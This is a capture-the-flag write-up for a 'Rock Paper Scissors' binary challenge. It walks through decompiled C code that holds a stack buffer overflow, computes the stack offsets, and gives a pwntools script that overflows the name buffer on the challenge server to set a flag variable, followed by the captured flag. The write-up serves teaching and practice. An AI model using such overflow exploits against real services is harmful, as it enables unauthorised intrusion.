# Rock Paper Scissors

## Description

Rock Paper Scissors, SHOOT

Flag Format: 0CTF{}

## Flag

```
0CTF{I_HATE_C}
```

## Solution

On decompiling (dogbolt.org) the `rps` ELF file, we get `rps_HexRays.c`.

We can observe that this is yet another buffer overflow challenge as it tries to get a string of length 150 into a 100 byte sized buffer.

```c
	char s[100];        // [esp+0h] [ebp-7Eh] BYREF
	char v5[2];         // [esp+64h] [ebp-1Ah] BYREF
	int ComputerChoice; // [esp+66h] [ebp-18h]
	char v7;            // [esp+6Dh] [ebp-11h]
    ...
    v7 = 0;
    ...
	puts("Welcome to Rock, Paper, Scissors!");
	printf("Enter your name: ");
	fgets(s, 150, stdin);
	s[strcspn(s, "\n")] = 0;
```

The strcspn line just overwrites the first `'\n'` char with a `'\0'` as `fgets` preserves newline in input.

After the program prints the move choices, we have the code:

```c
		fgets(v5, 3, stdin);

		v5[0] -= 48;
		if (!v5[0])
			break;
		if (v5[0] > 0 && v5[0] <= 4) {
			ComputerChoice = generateComputerChoice();
			printf("Computer chooses ");
			if (ComputerChoice == 2) {
				puts("Scissors.");
			} else if (ComputerChoice <= 2) {
				if (ComputerChoice) {
					if (ComputerChoice == 1)
						puts("Paper.");
				} else {
					puts("Rock.");
				}
			}
			if (v5[0] == 4) {
				if (v7 == 1) {
					if (flag) {
						puts("You won with devastating damage, and the computer burst and gave you a flag.");
						printf(flag);
						exit(0);
					}
					puts("Contact an administrator, since the flag is not available.");
				} else {
                    ...
```

So, the interesting case is when the user inputs `4` and `v7 = 1`. As the variable `v7` is initializes with `0` and it is never reassigned, we can assume that it needs to be overwritten by the buffer overflow.

The memory layout seems pretty clear from the comments in the decompiled source file and the objdump output:

```c
	char s[100];        // [esp+0h] [ebp-7Eh] BYREF
	char v5[2];         // [esp+64h] [ebp-1Ah] BYREF
	int ComputerChoice; // [esp+66h] [ebp-18h]
	char v7;            // [esp+6Dh] [ebp-11h]
```

`s` starts at `ebp - 0x7E (126)` and ends at `ebp - 0x19 (25)` (inclusive).
`v7` is at `ebp - 0x11 (17)`.

So, this means we need to write from `ebp - 126` till `ebp - 17` which is in total 110 bytes (126 - 17 + 1).

Also, the last byte we write must be `0x01`. We can safely write all bytes as `0x01` but we choose to use some printable characters (J) to get a visual feedback in the output.

We can do this like:

```py
from pwn import *


r = remote("13.232.34.171", 30917)
r.readuntil(b"name: ")

r.send(b"J" + b"\x01" * (110 - 1) + b"\n")
r.readuntil(b"choice: ")
r.send(b"4\n")
print(r.readall())
```

The output after running this gives:

```
$ python solve.py 
[+] Opening connection to 13.232.34.171 on port 30917: Done
[+] Receiving all data: Done (118B)
[*] Closed connection to 13.232.34.171 port 30917
b'Computer chooses Scissors.\nYou won with devastating damage, and the computer burst and gave you a flag.\n0CTF{I_HATE_C}'
```

## References

- <https://dogbolt.org/?id=a282bb85-9f8e-4146-b5bb-9118483b096f#Hex-Rays=246>

## Attachments

- [rps](https://drive.google.com/file/d/1i_0uWVehhg8arRQHVG5ExCO6fBsKqXkm/view)
